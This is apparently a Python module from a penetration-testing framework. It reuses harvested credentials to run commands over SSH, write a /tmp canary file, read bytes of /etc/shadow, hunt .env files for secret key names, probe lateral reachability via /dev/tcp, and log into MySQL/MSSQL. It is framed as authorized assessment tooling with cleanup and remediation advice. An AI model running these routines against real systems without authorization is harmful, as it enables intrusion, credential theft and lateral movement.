"""Verified exploitation proof — undeniable evidence that access was achieved.

Every penetration test report requires proof that exploitation succeeded.
This module connects to compromised hosts using already-harvested credentials
and performs safe, verifiable actions to prove access.  All canary files are
cleaned up immediately.  Sensitive content is never stored — only hashes and
type labels are recorded as evidence.

Consumes ``credential.valid`` facts produced by upstream modules (ssh_brute,
credential_spray, default_creds, kerberoast, etc.) and produces
``exploit.verified`` facts with evidence records.
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import re
import uuid
from typing import TYPE_CHECKING, Any

from pacdoor.core.models import (
    Evidence,
    ExploitSafety,
    Finding,
    Phase,
    Severity,
)
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

_CONNECT_TIMEOUT = 10
_CMD_TIMEOUT = 15
_CANARY_PREFIX = ".pacdoor_proof_"

# Patterns to identify secret keys (matched against KEY=VALUE lines).
_SECRET_KEY_PATTERNS = re.compile(
    r"^(DATABASE_URL|DB_PASSWORD|DB_PASS|SECRET_KEY|API_KEY|API_SECRET|"
    r"AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|STRIPE_KEY|STRIPE_SECRET|"
    r"SENDGRID_API_KEY|TWILIO_AUTH_TOKEN|JWT_SECRET|JWT_KEY|"
    r"PRIVATE_KEY|ENCRYPTION_KEY|OAUTH_SECRET|GITHUB_TOKEN|"
    r"SLACK_TOKEN|REDIS_PASSWORD|MONGO_URI|POSTGRES_PASSWORD|"
    r"MYSQL_PASSWORD|SESSION_SECRET|APP_SECRET)\s*=",
    re.IGNORECASE,
)


# ── Lazy imports ──────────────────────────────────────────────────────

_paramiko_available: bool | None = None
_impacket_available: bool | None = None


def _ensure_paramiko() -> bool:
    global _paramiko_available  # noqa: PLW0603
    if _paramiko_available is not None:
        return _paramiko_available
    try:
        import paramiko  # type: ignore[import-untyped]  # noqa: F401

        _paramiko_available = True
    except ImportError:
        log.debug("paramiko not installed — SSH proof unavailable")
        _paramiko_available = False
    return _paramiko_available


def _ensure_impacket() -> bool:
    global _impacket_available  # noqa: PLW0603
    if _impacket_available is not None:
        return _impacket_available
    try:
        import impacket.smbconnection  # type: ignore[import-untyped]  # noqa: F401

        _impacket_available = True
    except ImportError:
        log.debug("impacket not installed — SMB proof unavailable")
        _impacket_available = False
    return _impacket_available


# ── SSH helpers (paramiko — synchronous, run via to_thread) ───────────


def _ssh_exec(
    ip: str,
    username: str,
    password: str | None = None,
    key: str | None = None,
    command: str = "id",
    timeout: int = _CMD_TIMEOUT,
) -> str | None:
    """Execute a single command over SSH and return stdout."""
    if not _ensure_paramiko():
        return None
    import paramiko  # type: ignore[import-untyped]

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        connect_kwargs: dict[str, Any] = {
            "hostname": ip,
            "port": 22,
            "username": username,
            "timeout": _CONNECT_TIMEOUT,
            "allow_agent": False,
            "look_for_keys": False,
        }
        if password:
            connect_kwargs["password"] = password
        if key:
            import io
            pkey = paramiko.RSAKey.from_private_key(io.StringIO(key))
            connect_kwargs["pkey"] = pkey

        client.connect(**connect_kwargs)
        _, stdout, _ = client.exec_command(command, timeout=timeout)
        return stdout.read().decode(errors="replace").strip()
    except Exception as exc:
        log.debug("SSH exec failed on %s: %s", ip, exc)
        return None
    finally:
        client.close()


def _ssh_write_read_delete(
    ip: str,
    username: str,
    password: str | None = None,
    key: str | None = None,
) -> dict[str, Any] | None:
    """Write a canary file, read it back, then delete it. Returns proof dict."""
    if not _ensure_paramiko():
        return None
    import paramiko  # type: ignore[import-untyped]

    canary_id = uuid.uuid4().hex[:12]
    canary_path = f"/tmp/{_CANARY_PREFIX}{canary_id}"
    canary_content = f"PACDOOR authorized security assessment proof — {canary_id}"

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        connect_kwargs: dict[str, Any] = {
            "hostname": ip,
            "port": 22,
            "username": username,
            "timeout": _CONNECT_TIMEOUT,
            "allow_agent": False,
            "look_for_keys": False,
        }
        if password:
            connect_kwargs["password"] = password
        if key:
            import io
            pkey = paramiko.RSAKey.from_private_key(io.StringIO(key))
            connect_kwargs["pkey"] = pkey

        client.connect(**connect_kwargs)
        sftp = client.open_sftp()
        try:
            # Write
            with sftp.open(canary_path, "w") as f:
                f.write(canary_content)
            # Read back
            with sftp.open(canary_path, "r") as f:
                readback = f.read().decode(errors="replace").strip()
            if readback != canary_content:
                return None
            return {"path": canary_path, "canary_id": canary_id}
        finally:
            # Always clean up
            try:
                sftp.remove(canary_path)
            except Exception:
                # Fallback: try rm via exec
                try:
                    client.exec_command(f"rm -f {canary_path}")
                except Exception:
                    pass
            sftp.close()
    except Exception as exc:
        log.debug("SSH canary failed on %s: %s", ip, exc)
        return None
    finally:
        client.close()


def _ssh_read_sensitive(
    ip: str,
    username: str,
    password: str | None = None,
    key: str | None = None,
) -> dict[str, Any] | None:
    """Read first 64 bytes of /etc/shadow and return SHA-256 hash."""
    result = _ssh_exec(
        ip, username, password, key,
        command="head -c 64 /etc/shadow 2>/dev/null",
    )
    if result and len(result) > 0:
        h = hashlib.sha256(result.encode()).hexdigest()
        return {"file": "/etc/shadow", "sha256": h, "length": len(result)}
    return None


def _ssh_find_secrets(
    ip: str,
    username: str,
    password: str | None = None,
    key: str | None = None,
) -> list[dict[str, Any]]:
    """Search common paths for .env files and report key names only."""
    secrets_found: list[dict[str, Any]] = []

    # Find .env files in common locations
    find_cmd = (
        "find /var/www /opt /srv /app /home /root "
        "-maxdepth 3 -name '.env' -o -name '.env.local' "
        "-o -name '.env.production' 2>/dev/null | head -20"
    )
    paths_output = _ssh_exec(ip, username, password, key, command=find_cmd)
    if not paths_output:
        return secrets_found

    for path in paths_output.splitlines():
        path = path.strip()
        if not path:
            continue
        # Read the file and extract only key names
        content = _ssh_exec(
            ip, username, password, key,
            command=f"cat '{path}' 2>/dev/null",
        )
        if not content:
            continue
        key_names: list[str] = []
        for line in content.splitlines():
            line = line.strip()
            if line.startswith("#") or "=" not in line:
                continue
            if _SECRET_KEY_PATTERNS.match(line):
                key_name = line.split("=", 1)[0].strip()
                key_names.append(key_name)
        if key_names:
            secrets_found.append({"path": path, "keys": key_names})

    return secrets_found


def _ssh_pivot_check(
    ip: str,
    username: str,
    password: str | None = None,
    key: str | None = None,
    internal_targets: list[str] | None = None,
) -> list[str]:
    """From compromised host, check TCP connectivity to internal targets."""
    if not internal_targets:
        return []
    reachable: list[str] = []
    # Batch check via bash
    targets_str = " ".join(internal_targets[:20])
    cmd = (
        f"for h in {targets_str}; do "
        f"(echo >/dev/tcp/$h/22 || echo >/dev/tcp/$h/445 || "
        f"echo >/dev/tcp/$h/80) 2>/dev/null && echo $h; done"
    )
    output = _ssh_exec(ip, username, password, key, command=cmd)
    if output:
        for line in output.splitlines():
            line = line.strip()
            if line and line in internal_targets:
                reachable.append(line)
    return reachable


# ── Database proof helpers ────────────────────────────────────────────


def _db_proof_mysql(
    ip: str, port: int, username: str, password: str,
) -> dict[str, Any] | None:
    """Connect to MySQL, get version and table count."""
    try:
        import pymysql  # type: ignore[import-untyped]

        conn = pymysql.connect(
            host=ip, port=port, user=username, password=password,
            connect_timeout=_CONNECT_TIMEOUT,
        )
        try:
            with conn.cursor() as cur:
                cur.execute("SELECT VERSION()")
                version = cur.fetchone()[0]
                cur.execute(
                    "SELECT COUNT(*) FROM information_schema.tables "
                    "WHERE table_schema NOT IN ('information_schema', 'mysql', "
                    "'performance_schema', 'sys')"
                )
                table_count = cur.fetchone()[0]
                cur.execute(
                    "SELECT COUNT(DISTINCT table_schema) FROM "
                    "information_schema.tables WHERE table_schema NOT IN "
                    "('information_schema', 'mysql', 'performance_schema', 'sys')"
                )
                db_count = cur.fetchone()[0]
            return {
                "type": "MySQL",
                "version": version,
                "tables": table_count,
                "databases": db_count,
            }
        finally:
            conn.close()
    except Exception as exc:
        log.debug("MySQL proof failed on %s:%d: %s", ip, port, exc)
        return None


def _db_proof_mssql(
    ip: str, port: int, username: str, password: str, domain: str = "",
) -> dict[str, Any] | None:
    """Connect to MSSQL, get version and table count."""
    try:
        from impacket import tds  # type: ignore[import-untyped]

        ms = tds.MSSQL(ip, port)
        ms.connect()
        try:
            if domain:
                ms.login(domain + "\\" + username, password)
            else:
                ms.login(username, password)
            ms.sql_query("SELECT @@VERSION")
            row = ms.rows
            version = str(row[0][""] if row else "unknown")[:100]
            ms.sql_query(
                "SELECT COUNT(*) AS cnt FROM information_schema.tables"
            )
            table_count = ms.rows[0]["cnt"] if ms.rows else 0
            return {
                "type": "MSSQL",
                "version": version,
                "tables": table_count,
                "databases": 0,
            }
        finally:
            ms.disconnect()
    except Exception as exc:
        log.debug("MSSQL proof failed on %s:%d: %s", ip, port, exc)
        return None


# ── Module class ──────────────────────────────────────────────────────


class VerifiedProofModule(BaseModule):
    """Prove exploitation by performing safe, verifiable actions on
    compromised hosts.  Every proof is cleaned up after verification.
    Sensitive data is never stored — only hashes and type labels."""

    @property
    def name(self) -> str:
        return "post.verified_proof"

    @property
    def description(self) -> str:
        return (
            "Prove exploitation success with verifiable evidence: command "
            "execution, file write/read, sensitive file access, database "
            "access, secret discovery, and network pivot verification"
        )

    @property
    def phase(self) -> Phase:
        return Phase.POST_EXPLOIT

    @property
    def safety(self) -> ExploitSafety:
        return ExploitSafety.DANGEROUS

    @property
    def attack_technique_ids(self) -> list[str]:
        return ["T1059", "T1005"]

    @property
    def required_facts(self) -> list[str]:
        return ["credential.valid"]

    @property
    def produced_facts(self) -> list[str]:
        return ["exploit.verified", "exploit.proof"]

    async def check(self, ctx: ModuleContext) -> bool:
        if not (_ensure_paramiko() or _ensure_impacket()):
            return False
        return await super().check(ctx)

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []

        # Gather credentials and hosts
        creds = await ctx.facts.get_values("credential.valid")
        admin_creds = await ctx.facts.get_values("credential.admin")
        all_creds = list(creds) + list(admin_creds)

        hosts = await ctx.facts.get_values("host")
        if not all_creds or not hosts:
            return findings

        # Deduplicate: (ip, username) -> best credential
        cred_map: dict[tuple[str, str], dict[str, Any]] = {}
        for cred in all_creds:
            ip = getattr(cred, "host_ip", None) or ""
            username = getattr(cred, "username", "")
            password = getattr(cred, "value", "")
            cred_type = getattr(cred, "cred_type", "password")
            host_id = getattr(cred, "host_id", "")
            domain = getattr(cred, "domain", "") or ""

            # Resolve IP from host_id if needed
            if not ip and host_id:
                for h in hosts:
                    if h.id == host_id:
                        ip = h.ip
                        break
            if not ip or not username:
                continue

            key = (ip, username)
            if key not in cred_map:
                cred_map[key] = {
                    "ip": ip,
                    "username": username,
                    "password": password if str(cred_type) == "password" else None,
                    "hash": password if str(cred_type) == "ntlm_hash" else None,
                    "key": password if str(cred_type) == "ssh_key" else None,
                    "host_id": host_id,
                    "domain": domain,
                }

        # Get all known host IPs for pivot testing
        all_ips = [h.ip for h in hosts]

        # Run proofs for each credential
        for (ip, username), cred_info in cred_map.items():
            await ctx.rate_limiter.acquire()

            host_id = cred_info["host_id"]
            password = cred_info["password"]
            ssh_key = cred_info["key"]
            domain = cred_info["domain"]

            # ── 1. Command execution proof ───────────────────────────
            if _ensure_paramiko() and (password or ssh_key):
                cmd_result = await asyncio.to_thread(
                    _ssh_exec, ip, username, password, ssh_key,
                    "echo '--- PACDOOR PROOF ---' && whoami && id && "
                    "hostname && uname -a 2>/dev/null",
                )
                if cmd_result and "PACDOOR PROOF" in cmd_result:
                    lines = cmd_result.splitlines()
                    whoami = lines[1] if len(lines) > 1 else "unknown"
                    findings.append(Finding(
                        title=f"Verified remote command execution as {whoami}",
                        description=(
                            f"Executed commands on {ip} via SSH as {username}. "
                            f"This proves an attacker with these credentials can "
                            f"run arbitrary commands on this system."
                        ),
                        severity=Severity.CRITICAL,
                        host_id=host_id,
                        module_name=self.name,
                        attack_technique_ids=self.attack_technique_ids,
                        evidence=[Evidence(
                            kind="command_output",
                            data=cmd_result[:500],
                        )],
                        remediation=(
                            "Rotate compromised credentials immediately. "
                            "Restrict SSH access via AllowUsers/AllowGroups. "
                            "Implement MFA for remote access."
                        ),
                    ))
                    await ctx.facts.add(
                        "exploit.verified",
                        {"type": "command_exec", "host": ip, "user": whoami},
                        self.name,
                        host_id=host_id,
                    )

            # ── 2. File canary proof ─────────────────────────────────
            if _ensure_paramiko() and (password or ssh_key):
                canary = await asyncio.to_thread(
                    _ssh_write_read_delete, ip, username, password, ssh_key,
                )
                if canary:
                    findings.append(Finding(
                        title=f"Verified file write access on {ip}",
                        description=(
                            f"Wrote canary file to {canary['path']}, read it "
                            f"back successfully, and deleted it. This proves "
                            f"an attacker can write arbitrary files."
                        ),
                        severity=Severity.CRITICAL,
                        host_id=host_id,
                        module_name=self.name,
                        attack_technique_ids=["T1105"],
                        evidence=[Evidence(
                            kind="file_canary",
                            data=(
                                f"Canary ID: {canary['canary_id']}\n"
                                f"Path: {canary['path']}\n"
                                f"Status: written, verified, cleaned up"
                            ),
                        )],
                        remediation=(
                            "Restrict write permissions. Implement file "
                            "integrity monitoring (FIM). Use read-only "
                            "filesystems where possible."
                        ),
                    ))
                    await ctx.facts.add(
                        "exploit.proof",
                        {"type": "file_write", "host": ip, "path": canary["path"]},
                        self.name,
                        host_id=host_id,
                    )

            # ── 3. Sensitive file read proof ─────────────────────────
            if _ensure_paramiko() and (password or ssh_key):
                shadow = await asyncio.to_thread(
                    _ssh_read_sensitive, ip, username, password, ssh_key,
                )
                if shadow:
                    findings.append(Finding(
                        title=f"Verified /etc/shadow read access on {ip}",
                        description=(
                            f"Read {shadow['length']} bytes from /etc/shadow. "
                            f"Content hash recorded (not the actual content). "
                            f"This proves password hashes are extractable."
                        ),
                        severity=Severity.CRITICAL,
                        host_id=host_id,
                        module_name=self.name,
                        attack_technique_ids=["T1003.008"],
                        evidence=[Evidence(
                            kind="sensitive_file_hash",
                            data=(
                                f"File: {shadow['file']}\n"
                                f"Bytes read: {shadow['length']}\n"
                                f"SHA-256: {shadow['sha256']}"
                            ),
                        )],
                        remediation=(
                            "Ensure /etc/shadow is readable only by root. "
                            "Rotate all passwords on this host. Use strong "
                            "hashing (bcrypt/scrypt) for stored passwords."
                        ),
                    ))
                    await ctx.facts.add(
                        "exploit.proof",
                        {"type": "shadow_read", "host": ip, "hash": shadow["sha256"]},
                        self.name,
                        host_id=host_id,
                    )

            # ── 4. Secret discovery proof ────────────────────────────
            if _ensure_paramiko() and (password or ssh_key):
                secrets = await asyncio.to_thread(
                    _ssh_find_secrets, ip, username, password, ssh_key,
                )
                for secret_info in secrets:
                    key_names = ", ".join(secret_info["keys"][:10])
                    findings.append(Finding(
                        title=(
                            f"Found {len(secret_info['keys'])} secrets in "
                            f"{secret_info['path']} on {ip}"
                        ),
                        description=(
                            f"Discovered secret keys in {secret_info['path']}. "
                            f"Key names only are recorded — values were NOT "
                            f"extracted or stored."
                        ),
                        severity=Severity.HIGH,
                        host_id=host_id,
                        module_name=self.name,
                        attack_technique_ids=["T1552.001"],
                        evidence=[Evidence(
                            kind="secret_keys",
                            data=(
                                f"Path: {secret_info['path']}\n"
                                f"Secret count: {len(secret_info['keys'])}\n"
                                f"Key names: {key_names}"
                            ),
                        )],
                        remediation=(
                            "Move secrets to a vault (HashiCorp Vault, AWS "
                            "Secrets Manager). Remove .env files from servers. "
                            "Use environment injection at deploy time."
                        ),
                    ))

            # ── 5. Network pivot proof ───────────────────────────────
            if _ensure_paramiko() and (password or ssh_key):
                # Test connectivity to other known hosts from this host
                other_ips = [h for h in all_ips if h != ip]
                if other_ips:
                    reachable = await asyncio.to_thread(
                        _ssh_pivot_check, ip, username, password, ssh_key,
                        other_ips[:20],
                    )
                    if reachable:
                        findings.append(Finding(
                            title=(
                                f"Verified network pivot from {ip} — "
                                f"{len(reachable)} hosts reachable"
                            ),
                            description=(
                                f"From compromised host {ip}, verified TCP "
                                f"connectivity to {len(reachable)} internal "
                                f"hosts. This demonstrates lateral movement "
                                f"capability and insufficient network "
                                f"segmentation."
                            ),
                            severity=Severity.MEDIUM,
                            host_id=host_id,
                            module_name=self.name,
                            attack_technique_ids=["T1046"],
                            evidence=[Evidence(
                                kind="pivot_reachable",
                                data=(
                                    f"Source: {ip}\n"
                                    f"Reachable hosts: {', '.join(reachable)}"
                                ),
                            )],
                            remediation=(
                                "Implement network segmentation. Use micro-"
                                "segmentation or zero-trust architecture. "
                                "Restrict inter-host traffic to required ports."
                            ),
                        ))
                        await ctx.facts.add(
                            "exploit.proof",
                            {
                                "type": "network_pivot",
                                "source": ip,
                                "reachable": reachable,
                            },
                            self.name,
                            host_id=host_id,
                        )

            # ── 6. Database access proof ─────────────────────────────
            # Check if this host has DB ports open
            open_ports = await ctx.facts.get_values("port.open")
            host_db_ports: list[tuple[int, str]] = []
            for port_fact in open_ports:
                port_obj = port_fact if hasattr(port_fact, "port") else None
                if port_obj and getattr(port_obj, "host_id", None) == host_id:
                    p = port_obj.port
                    if p == 3306:
                        host_db_ports.append((p, "mysql"))
                    elif p == 1433:
                        host_db_ports.append((p, "mssql"))

            for port_num, db_type in host_db_ports:
                if password:
                    if db_type == "mysql":
                        db_result = await asyncio.to_thread(
                            _db_proof_mysql, ip, port_num, username, password,
                        )
                    elif db_type == "mssql":
                        db_result = await asyncio.to_thread(
                            _db_proof_mssql, ip, port_num, username,
                            password, domain,
                        )
                    else:
                        db_result = None

                    if db_result:
                        findings.append(Finding(
                            title=(
                                f"Verified {db_result['type']} access on "
                                f"{ip}:{port_num}"
                            ),
                            description=(
                                f"Connected to {db_result['type']} "
                                f"{db_result['version'][:80]} with harvested "
                                f"credentials. Found {db_result['tables']} "
                                f"user tables."
                            ),
                            severity=Severity.HIGH,
                            host_id=host_id,
                            module_name=self.name,
                            attack_technique_ids=["T1078"],
                            evidence=[Evidence(
                                kind="database_access",
                                data=(
                                    f"Type: {db_result['type']}\n"
                                    f"Version: {db_result['version'][:100]}\n"
                                    f"Tables: {db_result['tables']}\n"
                                    f"Databases: {db_result['databases']}"
                                ),
                            )],
                            remediation=(
                                "Rotate database credentials. Restrict DB "
                                "access to application servers only. Use "
                                "least-privilege DB accounts."
                            ),
                        ))
                        await ctx.facts.add(
                            "exploit.verified",
                            {
                                "type": "database",
                                "host": ip,
                                "db": db_result["type"],
                                "tables": db_result["tables"],
                            },
                            self.name,
                            host_id=host_id,
                        )

        return findings
